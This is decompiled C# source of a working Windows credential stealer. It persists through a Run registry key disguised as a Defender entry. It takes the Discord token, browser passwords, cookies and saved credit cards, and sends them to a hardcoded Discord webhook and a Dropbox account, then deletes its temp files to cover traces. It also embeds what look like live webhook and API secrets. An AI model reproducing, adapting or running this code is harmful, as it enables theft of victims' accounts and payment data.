using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Dropbox.Api;
using Dropbox.Api.FileProperties;
using Dropbox.Api.Files;
using Microsoft.Win32;
using pazuzu.ChromiumBased;
using pazuzu.FireFox;
using pazuzu.Required;

namespace pazuzu;

internal class Program
{
	private static string userName = Environment.UserName;

	private static string pathStartUp = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private static string token = "ygICSHW0uQUAAAAAAAAAAUmK7RcHCgOXDX-DU2Seeuln1dQ7ZkhYj3BP6NyD-24N";

	private static string youDiscordWebHook = "https://canary.discord.com/api/webhooks/847708089728630784/sunVRLeG1XrSUhdZugO3colKMeInOWriexBfHYjI_22Lg3dY_RvSATjR3QcXUrHiv4mX";

	private static void Main(string[] args)
	{
		//IL_00bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_00e1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e8: Expected O, but got Unknown
		//IL_067b: Unknown result type (might be due to invalid IL or missing references)
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Path.Combine(pathStartUp, Path.GetFileName(location));
		if (!File.Exists(text))
		{
			byte[] bytes = File.ReadAllBytes(location);
			File.WriteAllBytes(text, bytes);
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Windows-DefenderV", text);
		}
		try
		{
			string stringx = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
			if (dotldb(ref stringx) || dotldb(ref stringx))
			{
			}
			Thread.Sleep(100);
			string text2 = tokenx(stringx, stringx.EndsWith(".log"));
			if (text2 == "")
			{
				text2 = "N/A";
			}
			using defender defender = new defender();
			ManagementObjectSearcher val = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
			ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					((ManagementBaseObject)val2).get_Item("Caption").ToString();
					defender.ProfilePicture = "https://cdn.discordapp.com/attachments/779687033382764554/786566078012194836/photo_2020-12-10_17-40-54.jpg";
					defender.UserName = "Rachel❤Kingsman";
					defender.WebHook = youDiscordWebHook;
					defender.SendMessage("```UserName: " + Environment.UserName + Environment.NewLine + "IP: None Token DiscordAPP: " + text2 + Environment.NewLine + "```");
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch (Exception ex)
		{
			_ = ex.Message;
		}
		new Thread((ThreadStart)delegate
		{
			CCpass();
		}).Start();
		new Thread((ThreadStart)delegate
		{
			Browser.ShowCookies(CCookies.Get());
		}).Start();
		new Thread((ThreadStart)delegate
		{
			Browser.ShowCreditCards(CreditCards.Get());
		}).Start();
		List<IPassReader> list = new List<IPassReader>();
		list.Add(new FirefoxPassReader());
		foreach (IPassReader item in list)
		{
			try
			{
				PrintCredentials(item.ReadPasswords());
			}
			catch (Exception)
			{
			}
		}
		new Thread((ThreadStart)delegate
		{
			FFCookies();
		}).Start();
		if (!File.Exists("C:\\Users\\" + userName + "\\AppData\\Local\\Temp\\Info.zip"))
		{
			Systemsinfo.PcInfo();
			Systemsinfo.ProgProc();
			ZipArchive zipArchive = ZipFile.Open("C:\\Users\\" + userName + "\\AppData\\Local\\Temp\\Info.zip", ZipArchiveMode.Create);
			string[] array = new string[2]
			{
				"C:\\Users\\" + userName + "\\AppData\\Local\\Temp\\Programms.txt",
				"C:\\Users\\" + userName + "\\AppData\\Local\\Temp\\Processes.txt"
			};
			string[] array2 = array;
			foreach (string text3 in array2)
			{
				zipArchive.CreateEntryFromFile(text3, Path.GetFileName(text3), CompressionLevel.Optimal);
			}
			zipArchive.Dispose();
		}
		try
		{
			using (new defender())
			{
				if (File.Exists("C:\\Users\\" + userName + "\\AppData\\Local\\Temp\\" + userName + "_CPass.txt"))
				{
					Task task = Task.Run((Func<Task?>)Run);
					task.Wait();
				}
				if (File.Exists("C:\\Users\\" + userName + "\\AppData\\Local\\Temp\\" + userName + "_FFPass.txt"))
				{
					Task task2 = Task.Run((Func<Task?>)Run2);
					task2.Wait();
				}
				if (File.Exists("C:\\Users\\" + userName + "\\AppData\\Local\\Temp\\" + userName + "_CCookies.txt"))
				{
					Task task3 = Task.Run((Func<Task?>)Run3);
					task3.Wait();
				}
				if (File.Exists("C:\\Users\\" + userName + "\\AppData\\Local\\Temp\\" + userName + "_FFCookies.txt"))
				{
					Task task4 = Task.Run((Func<Task?>)Run4);
					task4.Wait();
				}
				if (File.Exists("C:\\Users\\" + userName + "\\AppData\\Local\\Temp\\Info.zip"))
				{
					Task task5 = Task.Run((Func<Task?>)Run6);
					task5.Wait();
				}
			}
			if (File.Exists("C:\\Users\\" + userName + "\\AppData\\Local\\Temp\\" + userName + "_CCards.txt"))
			{
				Task task6 = Task.Run((Func<Task?>)Run5);
				task6.Wait();
			}
			Thread.Sleep(2);
			File.Delete("C:\\Users\\" + userName + "\\AppData\\Local\\Temp\\" + userName + "_CPass.txt");
			File.Delete("C:\\Users\\" + userName + "\\AppData\\Local\\Temp\\" + userName + "_CCookies.txt");
			File.Delete("C:\\Users\\" + userName + "\\AppData\\Local\\Temp\\" + userName + "_FFPass.txt");
			File.Delete("C:\\Users\\" + userName + "\\AppData\\Local\\Temp\\" + userName + "_FFCookies.txt");
			File.Delete("C:\\Users\\" + userName + "\\AppData\\Local\\Temp\\" + userName + "_CCards.txt");
			File.Delete("C:\\Users\\" + userName + "\\AppData\\Local\\Temp\\Info.zip");
		}
		catch (Exception ex3)
		{
			MessageBox.Show(ex3.InnerException!.Message);
			File.Delete("C:\\Users\\" + userName + "\\AppData\\Local\\Temp\\" + userName + "_CPass.txt");
			File.Delete("C:\\Users\\" + userName + "\\AppData\\Local\\Temp\\" + userName + "_CCookies.txt");
			File.Delete("C:\\Users\\" + userName + "\\AppData\\Local\\Temp\\" + userName + "_FFPass.txt");
			File.Delete("C:\\Users\\" + userName + "\\AppData\\Local\\Temp\\" + userName + "_FFCookies.txt");
			File.Delete("C:\\Users\\" + userName + "\\AppData\\Local\\Temp\\" + userName + "_CCards.txt");
			File.Delete("C:\\Users\\" + userName + "\\AppData\\Local\\Temp\\Info.zip");
		}
	}

	private static void CCpass()
	{
		List<Account> list = Chromium.Grab();
		string path = "C:\\Users\\" + userName + "\\AppData\\Local\\Temp\\" + userName + "_CPass.txt";
		foreach (Account item in list)
		{
			using StreamWriter streamWriter = File.AppendText(path);
			streamWriter.WriteLine("Url: " + item.URL);
			streamWriter.WriteLine("Username: " + item.UserName);
			streamWriter.WriteLine("Password: " + item.Password);
			streamWriter.WriteLine("Application: " + item.Application);
			streamWriter.WriteLine("Time: " + DateTime.Now);
			streamWriter.WriteLine("=============================");
		}
	}

	private static void FFCookies()
	{
		string path = "C:\\Users\\" + userName + "\\AppData\\Local\\Temp\\" + userName + "_FFCookies.txt";
		string[] mozillaBrowsers = Profile.GetMozillaBrowsers();
		foreach (string browserDir in mozillaBrowsers)
		{
			foreach (pazuzu.FireFox.Common.Cookie item in Cookies.Get(browserDir))
			{
				using StreamWriter streamWriter = File.AppendText(path);
				streamWriter.WriteLine(BrowserUtils.FormatCookie(item));
			}
		}
	}

	private static async Task Run()
	{
		DropboxClient dbx = new DropboxClient(token);
		try
		{
			string userName = Environment.UserName;
			string file = "C:\\Users\\" + userName + "\\AppData\\Local\\Temp\\" + userName + "_CPass.txt";
			string folder = "/" + userName;
			string filename = DateTime.Now.ToString() + "_CPass.txt";
			string url = "";
			using (MemoryStream mem = new MemoryStream(File.ReadAllBytes(file)))
			{
				Task<FileMetadata> updated = dbx.get_Files().UploadAsync(folder + "/" + filename, (WriteMode)(object)Add.Instance, false, (DateTime?)null, false, (IEnumerable<PropertyGroup>)null, false, (Stream)mem);
				updated.Wait();
			}
			Console.Write(url);
		}
		finally
		{
			((IDisposable)dbx)?.Dispose();
		}
		await Task.Yield();
	}

	private static async Task Run2()
	{
		DropboxClient dbx = new DropboxClient(token);
		try
		{
			string userName = Environment.UserName;
			string file = "C:\\Users\\" + userName + "\\AppData\\Local\\Temp\\" + userName + "_FFPass.txt";
			string folder = "/" + userName;
			string filename = DateTime.Now.ToString() + "_FFPass.txt";
			string url = "";
			using (MemoryStream mem = new MemoryStream(File.ReadAllBytes(file)))
			{
				Task<FileMetadata> updated = dbx.get_Files().UploadAsync(folder + "/" + filename, (WriteMode)(object)Add.Instance, false, (DateTime?)null, false, (IEnumerable<PropertyGroup>)null, false, (Stream)mem);
				updated.Wait();
			}
			Console.Write(url);
		}
		finally
		{
			((IDisposable)dbx)?.Dispose();
		}
		await Task.Yield();
	}

	private static async Task Run3()
	{
		DropboxClient dbx = new DropboxClient(token);
		try
		{
			string userName = Environment.UserName;
			string file = "C:\\Users\\" + userName + "\\AppData\\Local\\Temp\\" + userName + "_CCookies.txt";
			string folder = "/" + userName;
			string filename = DateTime.Now.ToString() + "_CCookies.txt";
			string url = "";
			using (MemoryStream mem = new MemoryStream(File.ReadAllBytes(file)))
			{
				Task<FileMetadata> updated = dbx.get_Files().UploadAsync(folder + "/" + filename, (WriteMode)(object)Add.Instance, false, (DateTime?)null, false, (IEnumerable<PropertyGroup>)null, false, (Stream)mem);
				updated.Wait();
			}
			Console.Write(url);
		}
		finally
		{
			((IDisposable)dbx)?.Dispose();
		}
		await Task.Yield();
	}

	private static async Task Run4()
	{
		DropboxClient dbx = new DropboxClient(token);
		try
		{
			string userName = Environment.UserName;
			string file = "C:\\Users\\" + userName + "\\AppData\\Local\\Temp\\" + userName + "_FFCookies.txt";
			string folder = "/" + userName;
			string filename = DateTime.Now.ToString() + "_FFCookies.txt";
			string url = "";
			using (MemoryStream mem = new MemoryStream(File.ReadAllBytes(file)))
			{
				Task<FileMetadata> updated = dbx.get_Files().UploadAsync(folder + "/" + filename, (WriteMode)(object)Add.Instance, false, (DateTime?)null, false, (IEnumerable<PropertyGroup>)null, false, (Stream)mem);
				updated.Wait();
			}
			Console.Write(url);
		}
		finally
		{
			((IDisposable)dbx)?.Dispose();
		}
		await Task.Yield();
	}

	private static async Task Run5()
	{
		DropboxClient dbx = new DropboxClient(token);
		try
		{
			string userName = Environment.UserName;
			string file = "C:\\Users\\" + userName + "\\AppData\\Local\\Temp\\" + userName + "_CCards.txt";
			string folder = "/" + userName;
			string filename = DateTime.Now.ToString() + "_CCards.txt";
			string url = "";
			using (MemoryStream mem = new MemoryStream(File.ReadAllBytes(file)))
			{
				Task<FileMetadata> updated = dbx.get_Files().UploadAsync(folder + "/" + filename, (WriteMode)(object)Add.Instance, false, (DateTime?)null, false, (IEnumerable<PropertyGroup>)null, false, (Stream)mem);
				updated.Wait();
			}
			Console.Write(url);
		}
		finally
		{
			((IDisposable)dbx)?.Dispose();
		}
		await Task.Yield();
	}

	private static async Task Run6()
	{
		DropboxClient dbx = new DropboxClient(token);
		try
		{
			string userName = Environment.UserName;
			string file = "C:\\Users\\" + userName + "\\AppData\\Local\\Temp\\Info.zip";
			string folder = "/" + userName;
			string filename = DateTime.Now.ToString() + "_Info.zip";
			string url = "";
			using (MemoryStream mem = new MemoryStream(File.ReadAllBytes(file)))
			{
				Task<FileMetadata> updated = dbx.get_Files().UploadAsync(folder + "/" + filename, (WriteMode)(object)Add.Instance, false, (DateTime?)null, false, (IEnumerable<PropertyGroup>)null, false, (Stream)mem);
				updated.Wait();
			}
			Console.Write(url);
		}
		finally
		{
			((IDisposable)dbx)?.Dispose();
		}
		await Task.Yield();
	}

	private static void PrintCredentials(IEnumerable<CredentialModel> data)
	{
		string path = "C:\\Users\\" + userName + "\\AppData\\Local\\Temp\\" + userName + "_FFPass.txt";
		foreach (CredentialModel datum in data)
		{
			using StreamWriter streamWriter = File.AppendText(path);
			streamWriter.WriteLine(datum.Url + "\r\n\tUsername: " + datum.Username + "\r\n\tPassword: " + datum.Password + "\r\n");
			streamWriter.WriteLine("Time: " + DateTime.Now);
			streamWriter.WriteLine("=============================");
		}
	}

	private static bool dotlog(ref string stringx)
	{
		if (Directory.Exists(stringx))
		{
			FileInfo[] files = new DirectoryInfo(stringx).GetFiles();
			int num = 0;
			FileInfo fileInfo;
			while (true)
			{
				if (num < files.Length)
				{
					fileInfo = files[num];
					if (fileInfo.Name.EndsWith(".log") && File.ReadAllText(fileInfo.FullName).Contains("oken"))
					{
						break;
					}
					num++;
					continue;
				}
				return stringx.EndsWith(".log");
			}
			stringx += fileInfo.Name;
			return stringx.EndsWith(".log");
		}
		return false;
	}

	private static string tokenx(string stringx, bool boolx = false)
	{
		byte[] bytes = File.ReadAllBytes(stringx);
		string @string = Encoding.UTF8.GetString(bytes);
		string text = "";
		string text2 = @string;
		while (text2.Contains("oken"))
		{
			string[] array = IndexOf(text2).Split(new char[1] { '"' });
			text = array[0];
			text2 = string.Join("\"", array);
			if (boolx && text.Length == 59)
			{
				break;
			}
		}
		return text;
	}

	private static bool dotldb(ref string stringx)
	{
		if (Directory.Exists(stringx))
		{
			FileInfo[] files = new DirectoryInfo(stringx).GetFiles();
			int num = 0;
			FileInfo fileInfo;
			while (true)
			{
				if (num < files.Length)
				{
					fileInfo = files[num];
					if (fileInfo.Name.EndsWith(".ldb") && File.ReadAllText(fileInfo.FullName).Contains("oken"))
					{
						break;
					}
					num++;
					continue;
				}
				return stringx.EndsWith(".ldb");
			}
			stringx += fileInfo.Name;
			return stringx.EndsWith(".ldb");
		}
		return false;
	}

	private static string IndexOf(string stringx)
	{
		string[] collection = stringx.Substring(stringx.IndexOf("oken") + 4).Split(new char[1] { '"' });
		List<string> list = new List<string>();
		list.AddRange(collection);
		list.RemoveAt(0);
		collection = list.ToArray();
		return string.Join("\"", collection);
	}
}
